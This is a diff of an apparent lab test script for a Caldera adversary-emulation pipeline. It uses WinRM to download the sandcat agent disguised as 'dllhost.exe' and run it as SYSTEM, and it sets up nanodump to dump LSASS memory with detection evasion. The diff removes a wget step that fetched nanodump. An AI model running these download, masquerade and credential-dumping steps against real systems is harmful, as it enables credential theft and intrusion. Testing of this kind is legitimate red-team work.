@@ -226,13 +226,11 @@ async function testFullPipeline() {
   const group = `test-${Date.now()}`
   const taskName = `CalderaSandcat-${group}`
 
-  const kaliPrereq = `if [ -f "\\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe" ]; then echo "ALREADY_PRESENT: \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe"; else mkdir -p \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && wget -q "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -O \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe && sudo systemctl restart caldera; fi`
-
   let agentPaw = null
 
   try {
     // ── Step 1: Clean slate ──
-    console.log("\n  [1/6] Cleaning previous agents, processes, and tasks...")
+    console.log("\n  [1/5] Cleaning previous agents, processes, and tasks...")
     try {
       const agents = await calderaRest("POST", { index: "agents" })
       for (const a of agents) {
@@ -250,25 +248,8 @@ async function testFullPipeline() {
     } catch {}
     console.log("    => clean")
 
-    // ── Step 2: Install prereqs on Kali ──
-    console.log("\n  [2/6] Running kali prereq (nanodump download + Caldera restart)...")
-    const prereqResult = await sshRun(KALI_IP, "kali", "kali", kaliPrereq)
-    console.log(`    => ${prereqResult.slice(0, 200)}`)
-    if (!prereqResult.includes("ALREADY_PRESENT")) {
-      console.log("    => Caldera was restarted, waiting to come back (120s timeout)...")
-      const start = Date.now()
-      while (Date.now() - start < 120000) {
-        try {
-          await calderaRest("POST", { index: "agents" })
-          console.log(`    => Caldera ready after ${Math.round((Date.now() - start) / 1000)}s`)
-          break
-        } catch {}
-        await new Promise(r => setTimeout(r, 1000))
-      }
-    }
-
-    // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
-    console.log(`\n  [3/6] Deploying sandcat as SYSTEM (group=${group})...`)
+    // ── Step 2: Deploy sandcat via Scheduled Task as SYSTEM ──
+    console.log(`\n  [2/5] Deploying sandcat as SYSTEM (group=${group})...`)
     const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
       `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
     console.log(`    => download: ${dlResult.trim()}`)
@@ -423,8 +404,7 @@ async function testFullPipeline() {
 //   - nanodump.x64.exe uses syscalls and invalid dump signature to avoid detection
 //   - Direct dump via -w flag: writes lsass memory to a .dmp file
 //   - Dump output: %temp%\nanodump.dmp → C:\Windows\Temp\nanodump.dmp (SYSTEM's temp)
-//   - kali_prereq: downloads nanodump.x64.exe from GitHub (fortra/nanodump), restarts Caldera
-//   - win_prereq: none
+//   - win_prereq: downloads nanodump.x64.exe via WinRM
 //   - Command PathToAtomicsFolder replaced with C:\Users\Public\nanodump.x64.exe (unquoted path)
 //   - No EULA acceptance needed (unlike ProcDump)
 //   - Agent runs as SYSTEM (Scheduled Task) for SeDebugPrivilege to access LSASS
@@ -458,8 +438,7 @@ async function main() {
   console.log(`\n  NanoDump ability specifics:`)
   console.log(`    - nanodump.x64.exe uses syscalls and invalid dump signature to avoid detection`)
   console.log(`    - Dump file: C:\\Windows\\Temp\\nanodump.dmp (SYSTEM's %temp% expansion)`)
-  console.log(`    - kali_prereq downloads nanodump from GitHub, restarts Caldera`)
-  console.log(`    - nanodump deployed to C:\\Users\\Public\\ on Windows for direct execution`)
+    console.log(`    - nanodump deployed to C:\\Users\\Public\\ on Windows via win_prereq (WinRM)`)
   console.log(`    - PathToAtomicsFolder replaced with local binary path (unquoted)`)
   console.log(`    - No EULA acceptance needed`)
 }
